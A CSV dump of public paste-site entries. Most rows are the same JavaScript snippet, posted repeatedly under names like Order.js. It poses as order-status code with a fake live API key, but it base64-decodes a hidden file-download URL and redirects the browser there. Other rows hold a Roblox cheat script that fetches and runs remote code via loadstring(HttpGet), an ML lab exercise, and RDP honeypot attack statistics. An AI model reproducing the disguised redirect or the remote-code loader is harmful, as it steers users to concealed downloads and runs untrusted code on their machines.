id,title,username,language,date,content
EDiGesUP,Untitled,amancse1,JavaScript,Friday 4th of April 2025 10:54:08 PM CDT,"comst ans = """
Lq1Wm9Yk,Untitled,kammex,JavaScript,Friday 4th of April 2025 10:36:07 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/04364/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
545as0PV,Products.js,dentira,JavaScript,Friday 4th of April 2025 10:20:43 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/71077/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GubzzLTt,Order.js,dentira,JavaScript,Friday 4th of April 2025 10:05:21 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68049/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5QndRHLd,Market.js,dentira,JavaScript,Friday 4th of April 2025 09:49:49 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91983/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Lrvd56DM,Untitled,dentira,JavaScript,Friday 4th of April 2025 09:34:24 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68253/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zHbDvVkC,Products.js,dentira,JavaScript,Friday 4th of April 2025 09:18:59 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/59938/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DBGeF0rE,Order.js,dentira,JavaScript,Friday 4th of April 2025 09:03:37 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10991/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MVPGf6GP,Market.js,dentira,JavaScript,Friday 4th of April 2025 08:48:14 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/37351/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pT1rHpXq,Untitled,dentira,JavaScript,Friday 4th of April 2025 08:32:51 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/58314/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NF1sdTTL,ML,risixl,Python,Friday 4th of April 2025 08:29:19 PM CDT,"#LAB 1
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
import seaborn as sns
from sklearn.datasets import fetch_california_housing

data=fetch_california_housing(as_frame=True)
df=data.frame
print(""Dataset Sample:"")
print(df.head())

def plot_histograms(df):
    df.hist(figsize=(12,10), bins=30,color='skyblue', edgecolor='black')
    plt.suptitle('Histograms of Numerical Features:',fontsize=16)
    plt.tight_layout(rect=(0,0,1,0.97))
    plt.show()

def plot_boxplots(df):
    plt.figure(figsize=(14,10))
    for i,column in enumerate(df.columns,1):
        plt.subplot(3,3,i)
        sns.boxplot(y=df[column],color='skyblue')
        plt.title(f'Box Plot of(column)',fontsize=12)
        plt.tight_layout()
    plt.show()

def analyze_features(df):
    print(""\nFeature Analysis:"")
    for column in df.columns:
        print(f'\nFeature:(column)')
        print(f""Mean: {df[column].mean():2f},Median: {df[column].median():2f}, Std Dev: {df[column].std():2f}"")
        q1=df[column].quantile(0.25)
        q3=df[column].quantile(0.75)
        iqr=q3-q1
        lower_bound=q1-1.5*iqr
        upper_bound=q3+1.5*iqr
        outliers=df[(df[column]<lower_bound) | (df[column]>upper_bound)]
        print(f'Number of Outliers: {len(outliers)}')

plot_histograms(df)
plot_boxplots(df)
analyze_features(df)

#LAB 2
import pandas as pd
import seaborn as sns
import matplotlib.pyplot as plt
from sklearn.datasets import fetch_california_housing

data=fetch_california_housing(as_frame=True)
df=data.frame
print(""Data Sample"")
print(df.head())
correlation_matrix=df.corr()
print(""Correlational Matrix:"")
print(correlation_matrix)

def plot_heatmap(corr_matrix):
    plt.figure(figsize=(10,8))
    sns.heatmap(corr_matrix,annot=True,fmt="".2f"",cmap=""cool"",cbar=True,square=True,linewidths=0.5)
    plt.title(""correlation matrix heatmap"", fontsize=16)
    plt.show()

def plot_pairplot(df):
    sns.pairplot(df,diag_kind=""kde"",corner=True,plot_kws={'alpha':0.5},diag_kws={'fill':True})
    plt.suptitle(""Pair Plot of Numerical Features"",y=1.02,fontsize=16)
    plt.show()

plot_heatmap(correlation_matrix)
plot_pairplot(df)

#LAB 3
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
from sklearn.datasets import load_iris
from sklearn.decomposition import PCA
from sklearn.preprocessing import StandardScaler

iris = load_iris()
X = iris.data
y = iris.target
target_names = iris.target_names


scaler = StandardScaler()
X_standardized = scaler.fit_transform(X)


pca = PCA(n_components=2)
X_pca = pca.fit_transform(X_standardized)
print(X_pca)


pca_df = pd.DataFrame(data=X_pca, columns=['Principal Component 1', 'Principal Component 2'])
pca_df['Target'] = y


plt.figure(figsize=(8, 6))
colors = ['r', 'g', 'b']

for target, color, label in zip(range(len(target_names)), colors, target_names):
    plt.scatter(
        pca_df.loc[pca_df['Target'] == target, 'Principal Component 1'],
        pca_df.loc[pca_df['Target'] == target, 'Principal Component 2'],
        color=color,
        alpha=0.6,
        label=label
    )

plt.title('PCA of Iris Dataset (2 components)', fontsize=16)
plt.xlabel('Principal Component 1', fontsize=12)
plt.ylabel('Principal Component 2', fontsize=12)
plt.legend(title='Target', loc='best')
plt.grid(alpha=0.3)
plt.show()

#LAB 5
import numpy as np
from sklearn.neighbors import KNeighborsClassifier
np.random.seed(42)
x = np.random.rand(100)
labels = np.where(x[:50]<=0.5,1,2)
x_train =x[:50].reshape(-1,1)
y_train = labels
x_test = x[:50].reshape(-1,1)
k_values=[1,2,3,4,5,20,30]
for k in k_values:
    knn =KNeighborsClassifier(n_neighbors=k)
    knn.fit(x_train,y_train)
    y_pred =knn.predict(x_test)
    print(f""\nk={k}:"")
    print(f""Predicted classes :{y_pred}"")"
b0faZrRY,Products.js,dentira,JavaScript,Friday 4th of April 2025 08:17:29 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/62478/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
H4nFB8Ga,Order.js,dentira,JavaScript,Friday 4th of April 2025 08:02:06 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/61740/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vMnXj148,Shinobi Storm Simple Hitbox Extender,LSJiqueue,Lua,Friday 4th of April 2025 07:59:34 PM CDT,"local j = loadstring(game:HttpGet('https://sirius.menu/rayfield'))(); local e = j:CreateWindow({ Name = ""\83\104\105\110\111\98\105\32\83\116\111\114\109\32\70\114\101\101"", Icon = 0,  LoadingTitle = ""\83\104\105\110\111\98\105\32\83\116\111\114\109"", LoadingSubtitle = ""\98\121\32\98\98\48\105\120"", Theme = ""\83\101\114\101\110\105\116\121"",  DisableRayfieldPrompts = false, DisableBuildWarnings = false,  ConfigurationSaving = { Enabled = true, FolderName = nil,  FileName = ""\66\105\103\32\72\117\98"" }, Discord = { Enabled = false,  Invite = ""\110\111\105\110\118\105\116\101\108\105\110\107"",  RememberJoins = true  }, KeySystem = false,  KeySettings = { Title = ""\85\110\116\105\116\108\101\100"", Subtitle = ""\75\101\121\32\83\121\115\116\101\109"", Note = ""\78\111\32\109\101\116\104\111\100\32\111\102\32\111\98\116\97\105\110\105\110\103\32\116\104\101\32\107\101\121\32\105\115\32\112\114\111\118\105\100\101\100"",  FileName = ""\75\101\121"",  SaveKey = true,  GrabKeyFromSite = false,  Key = {""\72\101\108\108\111""}  } }) local c = game:GetService(""\80\108\97\121\101\114\115"").LocalPlayer; local a = false;  local m = 0.7; local k = 0; local g = e:CreateTab(""\77\97\105\110\32\84\97\98""); local function r() task.spawn(function() while (a == true) do    task.wait(); for index, value in pairs(game:GetService(""\80\108\97\121\101\114\115""):GetChildren()) do  if (value.Name ~= c.Name) then  value.Character:FindFirstChild(""\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116"").Transparency = m;  value.Character:FindFirstChild(""\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116"").Size = Vector3.new(k,s,k); value.Character:FindFirstChild(""\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116"").Color = Color3.fromRGB(255,255,0);  end;  end;  end;  end); end; g:CreateToggle({ Name = ""\72\105\116\98\111\120"", CurrentValue = false, Callback = function(l)  a = l;  print(a); if (a == false) then task.wait(1); print(""\68\73\83\65\66\76\69\33""); for index, value in pairs(game:GetService(""\80\108\97\121\101\114\115""):GetChildren()) do  if (value.Name ~= c.Name) then  value.Character.HumanoidRootPart.Transparency = 1;  value.Character.HumanoidRootPart.Size = Vector3.new(2,2,1); value.Character.HumanoidRootPart.Color = Color3.fromRGB(163, 162, 165);  end;  end;  else r(); end; end;  });  g:CreateSlider({ Name = ""\72\105\116\98\111\120\32\83\105\122\101"", Range = {1, 30}, Increment = 1,  Suffix = """", CurrentValue = 1, Callback = function(l)  k = l;  print(k); end;  }); g:CreateSlider({ Name = ""\72\105\116\98\111\120\32\84\114\97\110\115\112\97\114\101\110\99\121"", Range = {0.1, 1};  Increment = 0.1,  Suffix = """", CurrentValue = 0.7, Callback = function(l)  m = l; print(m); end;  }); "
8NbPxgL3,Market.js,dentira,JavaScript,Friday 4th of April 2025 07:46:43 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/62803/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
E9Tc3dRd,Untitled,dentira,JavaScript,Friday 4th of April 2025 07:31:20 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/69753/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hxBTcFTk,2025-04-03_stats.json,rdp_snitch,JSON,Friday 4th of April 2025 07:18:40 PM CDT,"{
  ""ip"": {
    ""156.146.57.110"": 35271,
    ""147.182.229.114"": 858,
    ""138.199.24.6"": 64821,
    ""138.199.24.30"": 8760,
    ""156.146.57.52"": 8826,
    ""150.95.89.149"": 8712,
    ""156.146.57.174"": 8817,
    ""146.190.105.191"": 1263,
    ""106.14.144.233"": 426,
    ""102.129.145.197"": 9174,
    ""147.185.132.19"": 9,
    ""185.147.124.165"": 9,
    ""68.183.178.139"": 6,
    ""205.210.31.206"": 9,
    ""80.94.95.90"": 6,
    ""93.174.95.106"": 3,
    ""157.245.104.150"": 3,
    ""88.214.25.123"": 6,
    ""92.255.85.92"": 9,
    ""194.165.16.164"": 6,
    ""1.95.183.16"": 3,
    ""58.218.199.219"": 12,
    ""147.185.132.40"": 9,
    ""165.154.138.85"": 3,
    ""45.79.73.129"": 12,
    ""170.187.203.104"": 3,
    ""198.235.24.108"": 9,
    ""84.17.46.178"": 12
  },
  ""asn"": {
    ""AS212238"": 52914,
    ""AS14061"": 2130,
    ""AS60068"": 73593,
    ""AS135161"": 8712,
    ""AS37963"": 426,
    ""AS174"": 9174,
    ""AS396982"": 36,
    ""AS49505"": 9,
    ""AS204428"": 6,
    ""AS202425"": 3,
    ""AS35042"": 6,
    ""AS207566"": 9,
    ""AS48721"": 6,
    ""AS55990"": 3,
    ""AS4134"": 12,
    ""AS135377"": 3,
    ""AS63949"": 15
  },
  ""isp"": {
    ""Datacamp Limited"": 52914,
    ""DigitalOcean, LLC"": 2130,
    ""DataCamp Limited"": 73593,
    ""GMO-Z.COM PTE. LTD."": 8712,
    ""Hangzhou Alibaba Advertising Co"": 426,
    ""Cogent Communications"": 9174,
    ""Google LLC"": 36,
    ""JSC Selectel"": 9,
    ""SS-Net"": 6,
    ""IP Volume inc"": 3,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Chang Way Technologies Co. Limited"": 9,
    ""Flyservers S.A."": 6,
    ""DXTNET"": 3,
    ""Chinanet"": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Akamai Technologies, Inc."": 15
  },
  ""org"": {
    ""Datacamp Limited"": 52914,
    ""DigitalOcean, LLC"": 2130,
    ""Cdn77 SGP"": 73581,
    ""Zcom Thai"": 8712,
    ""Aliyun Computing Co., LTD"": 426,
    ""Netutils"": 9174,
    ""Palo Alto Networks, Inc"": 36,
    ""Almira LLC"": 9,
    ""Unmanaged LTD"": 6,
    ""IP Volume inc"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Chang Way Technologies Co. Limited"": 9,
    ""Flyservers S.A"": 6,
    ""Beijing Teletron Telecom Engineering Co., Ltd."": 3,
    ""Chinanet JS"": 12,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Linode"": 15,
    ""Cdn77 AMS"": 12
  },
  ""regionName"": {
    ""North West"": 126495,
    ""California"": 10080,
    ""Tokyo"": 8712,
    ""South West"": 1269,
    ""Shanghai"": 426,
    ""Moscow"": 18,
    ""Sofia-Capital"": 6,
    ""North Holland"": 15,
    ""Karnataka"": 3,
    ""Kowloon City"": 6,
    ""Kaunas"": 6,
    ""Guizhou"": 3,
    ""Jiangsu"": 12,
    ""Hesse"": 3,
    ""Georgia"": 3
  },
  ""country"": {
    ""Singapore"": 127764,
    ""United States"": 10083,
    ""Japan"": 8712,
    ""China"": 441,
    ""Russia"": 18,
    ""Bulgaria"": 6,
    ""The Netherlands"": 15,
    ""India"": 3,
    ""Hong Kong"": 6,
    ""Lithuania"": 6,
    ""Germany"": 3
  },
  ""account"": {
    ""hello"": 146964,
    ""zIUSdWivX"": 3,
    ""sfLjSJ"": 3,
    ""fZMizU"": 3,
    ""Domain"": 15,
    ""BDqFzlpWt"": 3,
    ""ScfRZI"": 3,
    ""khSizK"": 3,
    ""Administr"": 6,
    ""root"": 3,
    ""Test"": 15,
    ""lRmxRXldY"": 3,
    ""lWCxlE"": 3,
    ""SEuFSn"": 3,
    ""Administrator"": 3,
    ""ojqfilu4"": 12,
    ""beio"": 3,
    ""DUYvqdheA"": 3,
    ""nSlXHr"": 3,
    ""VYxYuJ"": 3
  },
  ""keyboard"": {
    ""Unknown"": 147057
  },
  ""client_build"": {
    ""Unknown"": 147057
  },
  ""client_name"": {
    ""Unknown"": 147057
  },
  ""ip_type"": {
    ""hosting & proxy"": 129057,
    ""hosting"": 8784,
    ""proxy"": 9198,
    ""Unknown"": 18
  }
}"
